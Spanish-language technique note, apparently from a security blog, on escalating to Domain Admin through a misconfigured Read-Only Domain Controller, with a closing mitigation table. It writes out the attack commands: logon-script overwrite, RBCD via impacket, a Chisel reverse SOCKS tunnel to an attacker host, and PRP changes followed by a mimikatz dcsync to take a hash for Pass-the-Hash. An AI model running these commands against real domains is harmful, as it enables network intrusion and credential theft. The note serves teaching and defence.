@@ -1,0 +1,154 @@
+---
+title: "RODC: por qué un controlador de solo lectura es Tier Zero"
+topic: "Active Directory"
+date: 2026-10-22
+tags: ["active-directory", "rodc", "sysvol", "rbcd", "password-replication-policy", "pivoting"]
+summary: "Un Read-Only Domain Controller mal gestionado es una ruta directa a Domain Admin. Esta nota recorre la técnica de forma genérica: el punto ciego de BloodHound en los logon scripts de SYSVOL, el salto a RBCD sobre el objeto del RODC, y el abuso de la Password Replication Policy para cachear y extraer un secreto desde el propio RODC."
+---
+
+Un **Read-Only Domain Controller (RODC)** se diseñó para sedes poco seguras: una copia del dominio que, en teoría, no guarda secretos sensibles. En la práctica, si su configuración o sus claves KDC caen en malas manos, se convierte en una **ruta directa a Domain Admin**. Esta nota describe la técnica de forma genérica —el concepto, no una máquina concreta— y cómo defenderse de ella.
+
+<AttackChain
+  label="Cadena de ataque · del SYSVOL a Domain Admin vía RODC"
+  steps={[
+    { title: 'Escritura en SYSVOL', desc: 'Delegación sobre los logon scripts: permiso NTFS, no ACL de objeto → invisible en BloodHound.', action: 'sobrescribir un logon script + apuntar scriptPath' },
+    { title: 'Usuario con shell', desc: 'El logon ejecuta el script → ejecución como el usuario víctima. Una cadena de ACLs lleva a una cuenta con más privilegio.', action: 'WRITE sobre el objeto del RODC' },
+    { title: 'RBCD sobre el RODC', desc: 'WRITE permite escribir msDS-AllowedToActOnBehalfOfOtherIdentity → delegación controlada.', action: 'pivot a la red interna (SOCKS)' },
+    { title: 'SYSTEM en el RODC', desc: 'Ticket de servicio impersonando a la cuenta objetivo → shell con privilegios en el RODC.', action: 'modificar la PRP + repadmin' },
+    { title: 'Secreto del objetivo → Domain Admin', desc: 'El RODC cachea el secreto de la cuenta objetivo; se extrae del propio RODC y se usa (Pass-the-Hash).', tone: 'win' },
+  ]}
+/>
+
+## Qué es un RODC y por qué es Tier Zero
+
+Un RODC mantiene una réplica **de solo lectura** del directorio y, a diferencia de un DC normal, **no cachea** las contraseñas de todo el dominio: solo las de las cuentas que su **Password Replication Policy (PRP)** permite. Dos atributos gobiernan esa política:
+
+- `msDS-RevealOnDemandGroup` — qué cuentas **puede** cachear el RODC.
+- `msDS-NeverRevealGroup` — qué cuentas **nunca** debe cachear (ahí viven, de serie, los grupos privilegiados).
+
+Además, cada RODC tiene su **propia cuenta `krbtgt`** (con un sufijo numérico, p. ej. `krbtgt_NNNNN`), separada de la `krbtgt` del dominio. Esa cuenta es una clave KDC: quien la controla puede forjar tickets válidos para ese RODC.
+
+<Callout type="note">
+La idea clave: controlar la **configuración** de un RODC (su PRP) o sus **claves KDC** equivale, con los pasos adecuados, a controlar el dominio. Por eso un RODC debe tratarse como **Tier Zero**, igual que un DC real.
+</Callout>
+
+## El punto ciego de BloodHound: logon scripts en SYSVOL
+
+El recurso `SYSVOL` replica, entre otras cosas, los **logon scripts** del dominio en `SYSVOL\<dominio>\scripts\`. Una delegación de GPO del tipo *Manage Logon Scripts* concede **escritura NTFS sobre esos ficheros**.
+
+Y aquí está el detalle que cuesta ver: ese permiso vive a **nivel de fichero (NTFS)**, no como una ACL sobre un objeto de Active Directory. **BloodHound no modela los permisos NTFS de SYSVOL**, así que ese primer salto no aparece en el grafo: el camino sale como *path not found* aunque exista.
+
+<Callout type="tip">
+Si BloodHound no encuentra ruta desde tu usuario inicial pero ese usuario pertenece a un grupo "custom" sin ACLs de salida, sospecha de permisos a nivel de fichero. Prueba los shares a mano: `SYSVOL`, `NETLOGON` y, sobre todo, la carpeta `scripts`.
+</Callout>
+
+La técnica, a alto nivel:
+
+1. Verificar escritura en `scripts\` subiendo un fichero de prueba por SMB.
+2. **Sobrescribir un logon script ya existente** (el que la máquina invoca de verdad) con el payload, en lugar de crear uno nuevo.
+3. Apuntar el atributo `scriptPath` de la cuenta objetivo a ese script.
+4. Esperar al ciclo de login: los logon scripts solo se ejecutan **durante la autenticación**, así que el ataque depende del *timing*.
+
+```bash
+# Verificar WRITE en scripts\ (ejemplo con smbclient)
+smbclient //<DC>/SYSVOL -U 'DOMAIN/<user>%<pass>' \
+  -c 'cd DOMAIN\scripts; put /etc/hostname test.txt; ls'
+
+# Apuntar el scriptPath de la cuenta objetivo (ejemplo con bloodyAD)
+bloodyad --host <DC> -d DOMAIN -u <user> -p '<pass>' \
+  set object <victima> scriptPath -v printerDetect.bat
+```
+
+## De la ACL al objeto: RBCD sobre el RODC
+
+Una vez con la shell del primer usuario, la cadena sigue por **ACLs que BloodHound sí modela**: típicamente un `ForceChangePassword` para alcanzar una cuenta más privilegiada, y de ahí un **`WRITE`/`GenericWrite` sobre el objeto de máquina del RODC**.
+
+`WRITE` sobre un objeto de máquina permite escribir `msDS-AllowedToActOnBehalfOfOtherIdentity`, es decir, configurar **Resource-Based Constrained Delegation (RBCD)**: hacer que el RODC "confíe" en una cuenta de máquina que nosotros controlamos.
+
+```bash
+# 1) Cuenta de máquina controlada (requiere SeMachineAccountPrivilege o cuota)
+impacket-addcomputer -dc-ip <DC> -computer-name 'EVIL$' \
+  -computer-pass '<pass>' 'DOMAIN/<user>:<pass>'
+
+# 2) Delegar el RODC → EVIL$
+impacket-rbcd -delegate-to 'RODC$' -delegate-from 'EVIL$' -action write \
+  'DOMAIN/<user>:<pass>' -dc-ip <DC>
+```
+
+<Callout type="warning">
+Kerberos es estricto con el reloj: si el *clock skew* con el DC supera unos ~5 minutos, los tickets se rechazan. Sincroniza (`ntpdate`/`chrony`) **antes** de cualquier paso Kerberos; es la causa número uno de fallos "inexplicables".
+</Callout>
+
+## Pivot a la red interna
+
+Es habitual que el RODC viva en una **subred interna** y que el DC sea *dual-homed* (dos interfaces). El RODC no es alcanzable directamente desde la VPN, así que hace falta un túnel. Un SOCKS inverso con **Chisel** sobre el primer host comprometido resuelve el pivot:
+
+```bash
+# Atacante
+chisel server -p 8001 --reverse --socks5
+```
+
+```powershell
+# Host comprometido (subir chisel antes)
+.\chisel.exe client <ATACANTE>:8001 R:socks
+```
+
+Con el SOCKS arriba y `proxychains`, se pide un **ticket de servicio** (S4U) impersonando a la cuenta objetivo contra el RODC, y se obtiene una shell con privilegios en él:
+
+```bash
+impacket-getST -spn cifs/RODC.DOMAIN -impersonate <objetivo> \
+  -dc-ip <DC> 'DOMAIN/EVIL$:<pass>'
+
+proxychains impacket-smbexec -k -no-pass \
+  -target-ip <IP_interna> 'DOMAIN/<objetivo>@RODC.DOMAIN'
+```
+
+<Callout type="tip">
+A través de SOCKS, `psexec` suele fallar al conectar los *named pipes* (<code>Something went wrong connecting the pipes</code>). **`smbexec`** tunela mucho mejor y da una shell semi-interactiva estable.
+</Callout>
+
+## El abuso clave: cachear y extraer un secreto del RODC
+
+Con control sobre el RODC (y su configuración), se fuerza a que **cachee el secreto de la cuenta objetivo** modificando su PRP: añadir la cuenta a `msDS-RevealOnDemandGroup` y quitarla de `msDS-NeverRevealGroup`. Después se dispara la replicación de ese secreto con `repadmin`:
+
+```powershell
+# Permitir que el RODC cachee la cuenta objetivo (ejemplo con PowerView)
+Set-DomainObject -Identity 'RODC$' -Set @{
+  'msDS-RevealOnDemandGroup' = @('CN=<objetivo>,CN=Users,DC=DOMAIN')
+}
+Set-DomainObject -Identity 'RODC$' -Clear 'msDS-NeverRevealGroup'
+```
+
+```cmd
+:: Forzar la replicación del secreto hacia el RODC
+repadmin /rodcpwdrepl RODC DC "CN=<objetivo>,CN=Users,DC=DOMAIN"
+```
+
+Una vez cacheado en el RODC, el secreto se extrae **del propio RODC** (donde ya tenemos privilegios), sin necesidad de forjar *golden tickets*:
+
+```cmd
+mimikatz "lsadump::dcsync /dc:RODC.DOMAIN /user:<objetivo>" exit
+```
+
+<Callout type="note">
+El atajo: como el objetivo es una cuenta que acabamos de cachear, basta un `dcsync` **apuntando al RODC** (`/dc:RODC`). El camino "de libro" —extraer la `krbtgt_NNNNN` del RODC → *RODC Golden Ticket* → *Key List Attack*— es más largo y, cuando puedes cachear directamente el objetivo, innecesario.
+</Callout>
+
+El hash resultante se usa con **Pass-the-Hash** para autenticarse como la cuenta objetivo. Si esa cuenta es privilegiada, es el compromiso del dominio.
+
+## Detección y mitigación
+
+Romper **cualquiera** de estos eslabones detiene la cadena:
+
+| Vector | Mitigación |
+| --- | --- |
+| Escritura en logon scripts de SYSVOL | Permisos NTFS estrictos sobre `SYSVOL\…\scripts`; revisar las delegaciones *Manage Logon Scripts*; no delegar GPO a grupos amplios. |
+| RBCD sobre el objeto del RODC | Restringir quién tiene `Write`/`GenericWrite` sobre objetos de DC/RODC; auditar con BloodHound las ACL de los objetos *Tier Zero*. |
+| Cuentas de máquina a demanda | Poner `ms-DS-MachineAccountQuota` a 0 y controlar `SeMachineAccountPrivilege`. |
+| RODC como Tier Zero | Tratar la `krbtgt` del RODC y su PRP con la misma sensibilidad que la `krbtgt` del dominio. |
+| Cambios en la PRP | **Alertar** sobre modificaciones de `msDS-RevealOnDemandGroup` / `msDS-NeverRevealGroup` y sobre `repadmin /rodcpwdrepl` de cuentas privilegiadas. |
+| Clock skew / signing | Mantener NTP sincronizado y el *SMB signing* requerido reduce la superficie de ataques Kerberos y relay. |
+
+<Callout type="warning">
+La conclusión para un informe: **un RODC mal gestionado es una ruta directa a Domain Admin**. Dejar una cuenta privilegiada replicable en un RODC, o permitir que un usuario de bajo nivel escriba sus logon scripts o sus ACLs, convierte una pieza "de solo lectura" en el eslabón más débil del dominio.
+</Callout>
